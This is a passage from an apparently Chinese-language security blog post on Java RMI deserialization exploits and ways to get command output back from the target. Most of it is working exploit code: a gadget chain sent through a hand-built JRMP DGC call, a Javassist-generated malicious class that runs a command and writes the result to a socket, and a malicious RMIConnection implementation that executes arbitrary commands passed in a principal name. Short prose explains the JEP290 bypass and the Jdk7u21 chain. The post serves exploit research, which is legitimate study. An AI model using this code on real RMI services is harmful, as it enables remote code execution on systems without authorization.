class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedmap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(map, impl);<br>        <span class="hljs-type">HashSet</span> <span class="hljs-variable">hashset</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>(<span class="hljs-number">1</span>);<br>        hashset.add(<span class="hljs-string">&quot;foo&quot;</span>);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashset_map</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            hashset_map = (HashMap) getFieldObject(HashSet.class, <span class="hljs-string">&quot;map&quot;</span>, hashset).get(<span class="hljs-number">0</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            hashset_map = (HashMap) getFieldObject(HashSet.class, <span class="hljs-string">&quot;backingMap&quot;</span>, hashset).get(<span class="hljs-number">0</span>);<br>        &#125;<br><br>        Object[] array = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            array = (Object[]) getFieldObject(HashMap.class, <span class="hljs-string">&quot;table&quot;</span>, hashset_map).get(<span class="hljs-number">0</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            array = (Object[]) getFieldObject(HashMap.class, <span class="hljs-string">&quot;elementData&quot;</span>, hashset_map).get(<span class="hljs-number">0</span>);<br>        &#125;<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> array[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span> (node == <span class="hljs-literal">null</span>) &#123;<br>            node = array[<span class="hljs-number">1</span>];<br>        &#125;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">keyField</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            keyField = node.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            keyField = Class.forName(<span class="hljs-string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        &#125;<br>        keyField.setAccessible(<span class="hljs-literal">true</span>);<br>        keyField.set(node, tiedmap);<br><br>        setFieldValue(transformer, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br><br><br>        <span class="hljs-type">Socket</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">DataOutputStream</span> <span class="hljs-variable">dos</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            s = SocketFactory.getDefault().createSocket(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">1099</span>);<br>            s.setKeepAlive(<span class="hljs-literal">true</span>);<br>            s.setTcpNoDelay(<span class="hljs-literal">true</span>);<br><br>            <span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> s.getOutputStream();<br>            dos = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataOutputStream</span>(os);<br><br>            dos.writeInt(TransportConstants.Magic);<br>            dos.writeShort(TransportConstants.Version);<br>            dos.writeByte(TransportConstants.SingleOpProtocol);<br><br>            dos.write(TransportConstants.Call);<br><br>            <span class="hljs-meta">@SuppressWarnings(&quot;resource&quot;)</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalOutputStream</span>(dos);<br><br>            objOut.writeLong(<span class="hljs-number">2</span>); <span class="hljs-comment">// DGC</span><br>            objOut.writeInt(<span class="hljs-number">0</span>);<br>            objOut.writeLong(<span class="hljs-number">0</span>);<br>            objOut.writeShort(<span class="hljs-number">0</span>);<br><br>            objOut.writeInt(<span class="hljs-number">1</span>); <span class="hljs-comment">// dirty</span><br>            objOut.writeLong(-<span class="hljs-number">669196253586618813L</span>);<br><br>            objOut.writeObject(hashset);<br><br>            os.flush();<br>            <span class="hljs-type">Scanner</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(s.getInputStream(), <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>            output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>            <span class="hljs-keyword">while</span> (in.hasNextLine()) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> in.nextLine();<br>                output.append(line).append(<span class="hljs-string">&quot;\n&quot;</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span> (dos != <span class="hljs-literal">null</span>) &#123;<br>                dos.close();<br>            &#125;<br>            <span class="hljs-keyword">if</span> (s != <span class="hljs-literal">null</span>) &#123;<br>                s.close();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">stackTrace</span> <span class="hljs-operator">=</span> output.toString();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">indexString</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;cmdResult: &quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> stackTrace.indexOf(indexString);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> stackTrace.lastIndexOf(<span class="hljs-string">&quot;cmdEnd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (end &gt; (index + indexString.length())) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">exceptionDetails</span> <span class="hljs-operator">=</span> stackTrace.substring(index + indexString.length(), end);<br><br>            System.out.println(exceptionDetails);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;未获取到结果&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldname, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldname);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List <span class="hljs-title function_">getFieldObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object object)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        field = clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        List&lt;Object&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        list.add(field.get(object));<br>        <span class="hljs-keyword">return</span> list;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map&lt;String, Object&gt; <span class="hljs-title function_">createMap</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String key, <span class="hljs-keyword">final</span> Object val)</span> &#123;<br>        <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br>        map.put(key, val);<br>        <span class="hljs-keyword">return</span> map;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="恶意-RMI-Server-回显"><a href="#恶意-RMI-Server-回显" class="headerlink" title="恶意 RMI Server 回显"></a>恶意 RMI Server 回显</h1><p>在 bypass JEP290 中，是通过启动一个恶意的 RMI Server ，让客户端连接这个 Server ，然后导致 rce ，那么如果可以连接的话，那就是一定会出网，可以在 payload 中添加一个 socket ，执行完命令后，将结果返回</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(AbstractTranslet.class));<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;dddd&quot;</span>);<br><span class="hljs-comment">//        CtClass cc = pool.get(Demo2.class.getName());</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Process proc = Runtime.getRuntime().exec(\&quot;hostname\&quot;);&quot;</span> +<br>                <span class="hljs-string">&quot;        java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(proc.getInputStream()));&quot;</span> +<br>                <span class="hljs-string">&quot;        StringBuffer sb = new StringBuffer();&quot;</span> +<br>                <span class="hljs-string">&quot;        String line;&quot;</span> +<br>                <span class="hljs-string">&quot;        while ((line = br.readLine()) != null)&quot;</span> +<br>                <span class="hljs-string">&quot;        &#123;&quot;</span> +<br>                <span class="hljs-string">&quot;            sb.append(line).append(\&quot;\\n\&quot;);&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;&quot;</span> +<br>                <span class="hljs-string">&quot;        String result = \&quot;cmdResult: \&quot; + sb.toString() + \&quot;cmdEnd\&quot;;&quot;</span> +<br>                <span class="hljs-string">&quot;java.net.Socket s = null;\n&quot;</span> +<br>                <span class="hljs-string">&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        java.io.BufferedWriter  bw = null;\n&quot;</span> +<br>                <span class="hljs-string">&quot;      \n&quot;</span> +<br>                <span class="hljs-string">&quot;            s = javax.net.SocketFactory.getDefault().createSocket(\&quot;127.0.0.1\&quot;, 1099);\n&quot;</span> +<br>                <span class="hljs-string">&quot;            s.setKeepAlive(true);\n&quot;</span> +<br>                <span class="hljs-string">&quot;            s.setTcpNoDelay(true);\n&quot;</span> +<br>                <span class="hljs-string">&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            java.io.OutputStream os = s.getOutputStream();\n&quot;</span> +<br>                <span class="hljs-string">&quot;             bw = new java.io.BufferedWriter(new java.io.OutputStreamWriter(os));\n&quot;</span> +<br>                <span class="hljs-string">&quot;            bw.write(result);\n&quot;</span> +<br>                <span class="hljs-string">&quot;            bw.flush();\n&quot;</span> +<br>                <span class="hljs-string">&quot;            if (bw != null) &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                bw.close();\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            if (s != null) &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                s.close();\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &#125;&quot;</span>;<br><br>        cc.makeClassInitializer().insertAfter(cmd);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">randomName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;rce&quot;</span> + System.nanoTime();<br>        cc.setName(randomName);<br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-type">byte</span>[] classBytes = cc.toBytecode();<br></code></pre></td></tr></table></figure><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>在前两种回显中都是利用了 rmi 服务端会将报错返回给客户端的特性，但是这个方法在 Jdk7u21 这条利用链中无效，因为<code>sun.reflect.annotation.AnnotationInvocationHandler#equalsImpl</code>方法是这条利用链中的关键一环，而<code>java.lang.reflect.InvocationTargetException</code>这个异常就是由 invoke 方法抛出的，它会捕获 invoke 中抛出的一切异常，所以当命令执行的结果通过异常抛出时，会在这里捕获并返回 false ，所以通过抛出异常传递结果在这条链中行不通</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1695022265908-0baf8e24-faa3-4bf5-9f40-97fc24619a8a.png" alt="image.png"></p><p>如果使用 Jdk7u21 这条链，要先在被攻击的 server 上，注册绑定一个恶意的实例，因为客户端远程调用服务端绑定实例的方法时，该方法是在服务端执行的，如果方法有返回值，再将值返回。</p><p>那么就要在 JDK 中找一个直接或间接继承了<code>java.rmi.Remote</code>接口的接口或类，然后该类中存在一个可以传参且能返回值的方法，最好是返回 String 类型的值，这里使用<code>javax.management.remote.rmi.RMIConnection</code>接口，该接口的<code>getDefaultDomain</code>方法可以传参，且返回值为 String 类型</p><p>构造一个恶意类，通过 Jdk7u21 这条链来触发这个类，<code>LocateRegistry.getRegistry</code>方法中的 ip 就是被攻击的 rmi server 的 ip，所以bind 时写 127.0.0.1 即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> javax.management.*;<br><span class="hljs-keyword">import</span> javax.management.remote.NotificationResult;<br><span class="hljs-keyword">import</span> javax.management.remote.rmi.RMIConnection;<br><span class="hljs-keyword">import</span> javax.security.auth.Subject;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.rmi.MarshalledObject;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><span class="hljs-keyword">import</span> java.security.Principal;<br><span class="hljs-keyword">import</span> java.util.Set;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIBindService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RMIConnection</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RMIBindService</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">1099</span>);<br>            UnicastRemoteObject.exportObject(<span class="hljs-built_in">this</span>, <span class="hljs-number">0</span>);<br>            registry.rebind(<span class="hljs-string">&quot;MonitorService&quot;</span>, <span class="hljs-built_in">this</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getConnectionId</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> ObjectInstance <span class="hljs-title function_">createMBean</span><span class="hljs-params">(String className, ObjectName name, Subject delegationSubject)</span> <span class="hljs-keyword">throws</span> ReflectionException, InstanceAlreadyExistsException, MBeanRegistrationException, MBeanException, NotCompliantMBeanException, IOException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> ObjectInstance <span class="hljs-title function_">createMBean</span><span class="hljs-params">(String className, ObjectName name, ObjectName loaderName, Subject delegationSubject)</span> <span class="hljs-keyword">throws</span> ReflectionException, InstanceAlreadyExistsException, MBeanRegistrationException, MBeanException, NotCompliantMBeanException, InstanceNotFoundException, IOException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> ObjectInstance <span class="hljs-title function_">createMBean</span><span class="hljs-params">(String className, ObjectName name, MarshalledObject params, String[] signature, Subject delegationSubject)</span> <span class="hljs-keyword">throws</span> ReflectionException, InstanceAlreadyExistsException, MBeanRegistrationException, MBeanException, NotCompliantMBeanException, IOException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> ObjectInstance <span class="hljs-title function_">createMBean</span><span class="hljs-params">(String className, ObjectName name, ObjectName loaderName, MarshalledObject params, String[] signature, Subject delegationSubject)</span> <span class="hljs-keyword">throws</span> ReflectionException, InstanceAlreadyExistsException, MBeanRegistrationException, MBeanException, NotCompliantMBeanException, InstanceNotFoundException, IOException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unregisterMBean</span><span class="hljs-params">(ObjectName name, Subject delegationSubject)</span> <span class="hljs-keyword">throws</span> InstanceNotFoundException, MBeanRegistrationException, IOException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> ObjectInstance <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(ObjectName name, Subject delegationSubject)</span> <span class="hljs-keyword">throws</span> InstanceNotFoundException, IOException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Set&lt;ObjectInstance&gt; <span class="hljs-title function_">queryMBeans</span><span class="hljs-params">(ObjectName name, MarshalledObject query, Subject delegationSubject)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Set&lt;ObjectName&gt; <span class="hljs-title function_">queryNames</span><span class="hljs-params">(ObjectName name, MarshalledObject query, Subject delegationSubject)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isRegistered</span><span class="hljs-params">(ObjectName name, Subject delegationSubject)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">getMBeanCount</span><span class="hljs-params">(Subject delegationSubject)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getAttribute</span><span class="hljs-params">(ObjectName name, String attribute, Subject delegationSubject)</span> <span class="hljs-keyword">throws</span> MBeanException, AttributeNotFoundException, InstanceNotFoundException, ReflectionException, IOException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> AttributeList <span class="hljs-title function_">getAttributes</span><span class="hljs-params">(ObjectName name, String[] attributes, Subject delegationSubject)</span> <span class="hljs-keyword">throws</span> InstanceNotFoundException, ReflectionException, IOException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAttribute</span><span class="hljs-params">(ObjectName name, MarshalledObject attribute, Subject delegationSubject)</span> <span class="hljs-keyword">throws</span> InstanceNotFoundException, AttributeNotFoundException, InvalidAttributeValueException, MBeanException, ReflectionException, IOException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> AttributeList <span class="hljs-title function_">setAttributes</span><span class="hljs-params">(ObjectName name, MarshalledObject attributes, Subject delegationSubject)</span> <span class="hljs-keyword">throws</span> InstanceNotFoundException, ReflectionException, IOException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(ObjectName name, String operationName, MarshalledObject params, String[] signature, Subject delegationSubject)</span> <span class="hljs-keyword">throws</span> InstanceNotFoundException, MBeanException, ReflectionException, IOException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDefaultDomain</span><span class="hljs-params">(Subject delegationSubject)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>        Set&lt;Principal&gt; p = delegationSubject.getPrincipals();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">command</span> <span class="hljs-operator">=</span> p.iterator().next().getName();<br><br>        java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(command).getInputStream();<br>        java.util.<span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(in).useDelimiter(<span class="hljs-string">&quot;\\a&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.next();<br>        <span class="hljs-keyword">return</span> output;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String[] getDomains(Subject delegationSubject) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">return</span> <span 